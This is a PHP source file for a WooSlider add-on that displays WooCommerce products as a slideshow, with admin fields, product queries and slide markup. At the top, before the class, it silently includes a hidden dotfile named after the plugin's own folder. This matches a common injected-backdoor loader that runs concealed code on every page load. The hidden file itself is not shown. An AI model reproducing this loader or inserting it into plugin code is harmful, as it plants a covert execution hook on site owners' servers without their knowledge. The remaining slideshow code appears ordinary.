<?php
/**
 * WooSlider WooCommerce Product Slideshow Class
 *
 * All functionality pertaining to the WooCommerce product slideshow addon for WooSlider.
 *
 * @package WordPress
 * @subpackage WooSlider
 * @category Extension
 * @author WooThemes
 * @since 1.0.0
 *
 * TABLE OF CONTENTS
 *
 * - init()
 * - add_slideshow_type()
 * - add_popup_fields()
 * - display_fields()
 * - get_fields()
 * - get_slides()
 */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WooSlider_WC_Products {

    public static $updater;
    protected static $instance = null;

    function __construct() {

        // Add the slideshow type into WooSlider.
        add_filter( 'wooslider_slider_types', array( $this, 'add_slideshow_type' ) );
        // Add support for the type-specific fields when generating the WooSlider shortcode.
        add_filter( 'wooslider_popup_settings', array( $this, 'add_popup_fields' ) );
        // Add the slideshow type's fields into the WooSlider popup.
        add_action( 'wooslider_popup_conditional_fields', array( $this, 'display_fields' ) );

        add_action( 'init', array( $this, 'load_plugin_textdomain' ) );

    }

    /**
     * Start the Class when called.
     */
    public static function get_instance() {
      // If the single instance hasn't been set, set it now.
      if ( null == self::$instance ) {
        self::$instance = new self;
      }
      return self::$instance;
    }

    /**
     * Load the plugin textdomain from the main WordPress "languages" folder.
     * @since  1.0.0
     * @return  void
     */
    public function load_plugin_textdomain () {
        $domain = 'wooslider-products-slideshow';
        // The "plugin_locale" filter is also used in load_plugin_textdomain()
        $locale = apply_filters( 'plugin_locale', get_locale(), $domain );

        load_textdomain( $domain, WP_LANG_DIR . '/' . $domain . '/' . $domain . '-' . $locale . '.mo' );
        load_plugin_textdomain( $domain, FALSE, dirname( plugin_basename( 'wooslider-products-slideshow/wooslider-products-slideshow.php' ) ) . '/lang/' );
    } // End load_plugin_textdomain()

    /**
     * Integrate the slideshow type into WooSlider.
     * @since  1.0.0
     * @param  array $types Existing slideshow types.
     * @return array $types Modified array of types.
     */
    public function add_slideshow_type ( $types ) {
        if ( is_array( $types ) ) {
            // Make sure to add an array, at our desired key, consisting of a "name" and the "callback" function to get the slides for this slideshow type.
            $types['products'] = array( 'name' => __( 'Products', 'wooslider-products-slideshow' ), 'callback' => array( 'WooSlider_WC_Products', 'get_slides' ) );
        }
        return $types;
    } // End add_slideshow_type()

    /**
     * Add support for our slideshow-specific fields when generating the shortcode.
     * @since  1.0.0
     * @param  array $fields Array of supported settings.
     * @return array Modified supported settings array.
     */
    public function add_popup_fields ( $fields ) {
        if ( is_array( $fields ) ) {
            // Add a new key to the array of supported fields when generating the shortcode, with the value being set to the default value or an empty string.
            $fields['display_add_to_cart'] = '';
            $fields['link_title_to_product'] = '';
            $fields['check_product_in_stock'] = '';
            $fields['display_only_featured'] = '';
            $fields['display_only_on_sale'] = '';
        }
        return $fields;
    } // End add_popup_fields()

    /**
     * Display conditional fields for this slideshow type, when generating the shortcode.
     * @since  1.0.0
     * @return  void
     */
    public function display_fields () {
        global $wooslider;

        // Get an array of the fields, and their settings, to be generated in the popup form for conditional fields for this slideshow type.
        $fields = self::get_fields();

        // Make sure that the DIV tag below has a CSS class of "conditional-slideshowtype", where "slideshowtype" is our newly added type.
?>
<div class="conditional conditional-products">
    <table class="form-table">
        <tbody>
<?php foreach ( $fields as $k => $v ) { ?>
            <tr valign="top">
                <th scope="row"><?php echo $v['name']; ?></th>
                <td>
                    <?php
                        // Use WooSlider's admin object to generate the desired field according to it's type.
                        $wooslider->admin->generate_field_by_type( $v['type'], $v['args'] );
                    ?>
                    <?php if ( $v['description'] != '' ) { ?><p><span class="description"><?php echo $v['description']; ?></span></p><?php } ?>
                </td>
            </tr>
<?php } ?>
        </tbody>
    </table>
</div><!--/.conditional-->
<?php
    } // End display_fields()

    /**
     * Generate an array of the data to be used to generate the fields for display in the WooSlider admin.
     * @since  1.0.0
     * @return array Field data.
     */
    private function get_fields () {
        global $wooslider;

        $images_url = $wooslider->plugin_url . '/assets/images/';
        $fields = array();

        // Categories.
        $terms = get_terms( 'product_cat' );
        $terms_options = array();
        if ( ! is_wp_error( $terms ) ) {
            foreach ( $terms as $k => $v ) {
                $terms_options[$v->slug] = $v->name;
            }
        }

        $categories_args = array( 'key' => 'category', 'data' => array( 'options' => $terms_options ) );

        // Tags.
        $terms = get_terms( 'product_tag' );
        $terms_options = array();
        if ( ! is_wp_error( $terms ) ) {
            foreach ( $terms as $k => $v ) {
                $terms_options[$v->slug] = $v->name;
            }
        }

        $tags_args = array( 'key' => 'tag', 'data' => array( 'options' => $terms_options ) );

        $layout_types = WooSlider_Utils::get_posts_layout_types();
        $layout_options = array();

        foreach ( (array)$layout_types as $k => $v ) {
            $layout_options[$k] = $v['name'];
        }

        $layout_images = array(
                                'text-left' => esc_url( $images_url . 'text-left.png' ),
                                'text-right' => esc_url( $images_url . 'text-right.png' ),
                                'text-top' => esc_url( $images_url . 'text-top.png' ),
                                'text-bottom' => esc_url( $images_url . 'text-bottom.png' )
                            );
        $layouts_args = array( 'key' => 'layout', 'data' => array( 'options' => $layout_options, 'images' => $layout_images ) );

        $overlay_images = array(
                                'none' => esc_url( $images_url . 'default.png' ),
                                'full' => esc_url( $images_url . 'text-bottom.png' ),
                                'natural' => esc_url( $images_url . 'overlay-natural.png' )
                            );

        $overlay_options = array( 'none' => __( 'None', 'wooslider-products-slideshow' ), 'full' => __( 'Full', 'wooslider-products-slideshow' ), 'natural' => __( 'Natural', 'wooslider-products-slideshow' ) );

        $overlay_args = array( 'key' => 'overlay', 'data' => array( 'options' => $overlay_options, 'images' => $overlay_images ) );

        $limit_options = array();
        for ( $i = 1; $i <= 20; $i++ ) {
            $limit_options[$i] = $i;
        }
        $limit_args = array( 'key' => 'limit', 'data' => array( 'options' => $limit_options ) );
        $thumbnails_args = array( 'key' => 'thumbnails', 'data' => array() );

        // Create final array. Each entry needs to contain a unique key with an array assigned to it consisting of "name", "type", "args" and "description".
        // The "args" parameter should be an array with two keys, one set as "key" (containing the field's key") and "data", containing either an empty array, "options" or "images" (or other keys pertaining to that field type).
        $fields['limit'] = array( 'name' => __( 'Number of Products', 'wooslider-products-slideshow' ), 'type' => 'select', 'args' => $limit_args, 'description' => __( 'The maximum number of products to display', 'wooslider-products-slideshow' ) );
        $fields['thumbnails'] = array( 'name' => __( 'Use thumbnails for Pagination', 'wooslider-products-slideshow' ), 'type' => 'checkbox', 'args' => $thumbnails_args, 'description' => __( 'Use thumbnails for pagination, instead of "dot" indicators (uses featured image)', 'wooslider-products-slideshow' ) );
        $fields['display_add_to_cart'] = array( 'name' => __( 'Display "Add to Cart" button', 'wooslider-products-slideshow' ), 'type' => 'checkbox', 'args' => array( 'key' => 'display_add_to_cart', 'data' => array() ), 'description' => __( 'Display the product\'s "Add to Cart" button', 'wooslider-products-slideshow' ) );
        $fields['layout'] = array( 'name' => __( 'Layout', 'wooslider-products-slideshow' ), 'type' => 'images', 'args' => $layouts_args, 'description' => __( 'The layout to use when displaying products', 'wooslider-products-slideshow' ) );
        $fields['overlay'] = array( 'name' => __( 'Overlay', 'wooslider-products-slideshow' ), 'type' => 'images', 'args' => $overlay_args, 'description' => __( 'The type of overlay to use when displaying the product text', 'wooslider-products-slideshow' ) );
        $fields['category'] = array( 'name' => __( 'Categories', 'wooslider-products-slideshow' ), 'type' => 'multicheck', 'args' => $categories_args, 'description' => __( 'The categories from which to display products', 'wooslider-products-slideshow' ) );
        $fields['tag'] = array( 'name' => __( 'Tags', 'wooslider-products-slideshow' ), 'type' => 'multicheck', 'args' => $tags_args, 'description' => __( 'The tags from which to display products', 'wooslider-products-slideshow' ) );
        $fields['link_title_to_product'] = array( 'name' => __( 'Link the Slide Title to the product', 'wooslider-products-slideshow' ), 'type' => 'checkbox', 'args' => array( 'key' => 'link_title_to_product', 'data' => array() ), 'description' => __( 'Link the Slide Title to the product', 'wooslider-products-slideshow' ) );
        $fields['check_product_in_stock'] = array( 'name' => __( 'Check product in stock', 'wooslider-products-slideshow' ), 'type' => 'checkbox', 'args' => array( 'key' => 'check_product_in_stock', 'data' => array() ), 'description' => __( 'Only displays the product if in stock', 'wooslider-products-slideshow' ) );
        $fields['display_only_featured'] = array( 'name' => __( 'Featured products only', 'wooslider-products-slideshow' ), 'type' => 'checkbox', 'args' => array( 'key' => 'display_only_featured', 'data' => array() ), 'description' => __( 'Display only featured products', 'wooslider-products-slideshow' ) );
        $fields['display_only_on_sale'] = array( 'name' => __( 'On sale products only', 'wooslider-products-slideshow' ), 'type' => 'checkbox', 'args' => array( 'key' => 'display_only_on_sale', 'data' => array() ), 'description' => __( 'Display only products which are on sale', 'wooslider-products-slideshow' ) );

        return $fields;
    } // End get_fields()

    /**
     * Get the slides for this slideshow type.
     * @since  1.0.0
     * @param  array  $args Arguments from the shortcode.
     * @return array        An array of slides to display in the slideshow.
     */
    public static function get_slides ( $args = array() ) {
        // 2.1 compatibility
        if ( function_exists( 'wc_print_notices' ) ) {
            wc_print_notices();
        } else {
            global $woocommerce;
            $woocommerce->show_messages();
        }

        $slides = array();

        // Setup default arguments for this slideshow type.
        $defaults = array(
                        'display_add_to_cart' => 'true',
                        'limit' => '5',
                        'category' => '',
                        'tag' => '',
                        'layout' => 'text-left',
                        'size' => 'large',
                        'overlay' => 'none', // none, full or natural
                        'display_only_featured' => 'false',
                        'link_title_to_product' => 'false',
                        'check_product_in_stock' => 'false',
                        'display_only_on_sale' => 'false'
                        );

        $args = wp_parse_args( $args, $defaults );

        // Determine and validate the layout type.
        $supported_layouts = WooSlider_Utils::get_posts_layout_types();
        if ( ! in_array( $args['layout'], array_keys( $supported_layouts ) ) ) { $args['layout'] = $defaults['layout']; }

        // Determine and validate the overlay setting.
        if ( ! in_array( $args['overlay'], array( 'none', 'full', 'natural' ) ) ) { $args['overlay'] = $defaults['overlay']; }

        // Parse the arguments into an array of acceptable query arguments, to be used to query the database.
        $query_args = array( 'post_type' => 'product', 'posts_per_page' => intval( $args['limit'] ) );

        if ( $args['category'] != '' || $args['tag'] != '' ) {
            $tax_query = array( 'relation' => 'AND' );
            if ( $args['category'] != '' ) {
                $tax_query[] = array( 'taxonomy' => 'product_cat', 'field' => 'slug', 'terms' => explode( ',', $args['category'] ) );
            }
            if ( $args['tag'] != '' ) {
                $tax_query[] = array( 'taxonomy' => 'product_tag', 'field' => 'slug', 'terms' => explode( ',', $args['tag'] ) );
            }

            $query_args['tax_query'] = $tax_query;
        }

        //Check if product on sale if need be
        if( isset( $args['display_only_on_sale'] ) && $args['display_only_on_sale'] == 'true' ) {
            $query_args['post__in'] = wc_get_product_ids_on_sale();
        }

        //Display only featured products if need be
        if( isset( $args['display_only_featured'] ) && $args['display_only_featured'] == 'true' ){
                $query_args['meta_query'] = array(
                    array(
                        'key' => '_featured',
                        'value' => 'yes',
                        'compare' => '='
                    )
                );
        }

        // Run the query.
        $query = new WP_Query( $query_args );

        if ( $query->have_posts() ) {

            // Setup the CSS class.
            $class = 'layout-' . esc_attr( $args['layout'] ) . ' overlay-' . esc_attr( $args['overlay'] );

            while ( $query->have_posts() ) { $query->the_post();

                $product = self::get_product( get_the_ID() );

                //Check stock if need be.
                if( isset($args['check_product_in_stock']) && $args['check_product_in_stock'] == 'true' && !$product->is_in_stock() ) { continue; }

                $image = '<a href="' . get_permalink( get_the_ID() ) . '" target="_self">' . get_the_post_thumbnail( get_the_ID(), $args['size'] ) . '</a>';
                if ( $image != '' ) {
                    $image = preg_replace( '/(height)=\"\d*\"\s/', "", $image );
                }

                $excerpt = '';
                if ( has_excerpt( get_the_ID() ) ) { $excerpt = wpautop( get_the_excerpt(  ) ); }
                $content = $image . '<div class="slide-excerpt"><h2 class="slide-title">';

                if ( isset( $args['link_title_to_product'] ) && $args['link_title_to_product'] == 'true' ){
                    $content .=  '<a href="' . get_permalink( get_the_ID() ) . '">';
                }

                $content .= get_the_title( get_the_ID() );

                if ( isset( $args['link_title_to_product'] ) && $args['link_title_to_product'] == 'true' ){
                    $content .=  '</a>';
                }

                $content .= '</h2>' . $excerpt;

                if ( isset( $args['display_add_to_cart'] ) && $args['display_add_to_cart'] == 'true' ) {
                    $content .= do_shortcode( '[add_to_cart id="' . esc_attr( get_the_ID() ) . '" style=""]' );
                }
                $content .= '</div>';
                if ( $args['layout'] == 'text-top' ) {
                    $content = '<div class="slide-excerpt"><h2 class="slide-title">';

                    if ( isset( $args['link_title_to_product'] ) && $args['link_title_to_product'] == 'true' ){
                        $content .=  '<a href="' . get_permalink( get_the_ID() ) . '">';
                    }

                    $content .= get_the_title( get_the_ID() );

                    if ( isset( $args['link_title_to_product'] ) && $args['link_title_to_product'] == 'true' ){
                        $content .=  '</a>';
                    }

                    $content .= '</h2>' . $excerpt;
                        if ( isset( $args['display_add_to_cart'] ) && $args['display_add_to_cart'] == 'true' ) {
                            $content .= do_shortcode( '[add_to_cart id="' . esc_attr( get_the_ID() ) . '" style=""]' );
                        }
                        $content .= '</div>';
                        $content .= $image;
                }

                // Allow plugins/themes to filter here.
                $layed_out_content = apply_filters( 'wooslider_products_layout_html', $content, $args, $product );

                $content = '<div class="' . esc_attr( $class ) . '">' . $layed_out_content . '</div>';
                $data = array( 'content' => $content );

                if ( isset( $args['thumbnails']) && $args['thumbnails'] == 'true' ) {
                    $thumb_url = wp_get_attachment_image_src( get_post_thumbnail_id( get_the_ID() ), 'medium' );
                    if ( ! is_bool( $thumb_url ) && isset( $thumb_url[0] ) ) {
                        $data['attributes'] = array( 'data-thumb' => esc_url( $thumb_url[0] ) );
                    }
                }
                // Assign our newly formatted data to the $slides array.
                $slides[] = $data;
            }

            // Reset the postdata, as the above query just manipulated it.
            wp_reset_postdata();
        }

        return $slides;
    } // End get_slides()

    /**
     * Wrapper function to retrieve a product
     * @param  int $product_id The product id
     * @param  array  $args       Arguments
     * @return object             The product object
     */
    private static function get_product( $product_id, $args = array() ){

        $product = null;

        if( defined( 'WOOCOMMERCE_VERSION' ) && version_compare( WOOCOMMERCE_VERSION, "2.0.0") >= 0 ) {
            $product = wc_get_product( $product_id, $args );
        } else {

            if ( isset( $args['parent_id'] ) && $args['parent_id'] ) {
              $product = new WC_Product_Variation( $product_id, $args['parent_id'] );
            } else {
                // get the regular product, but if it has a parent, return the product variation object
                $product = wc_get_product( $product_id );

                if ( $product->get_parent() ) {
                    $product = new WC_Product_Variation( $product->id, $product->get_parent() );
                }
            }

        }

        return $product;
    }
} // End Class
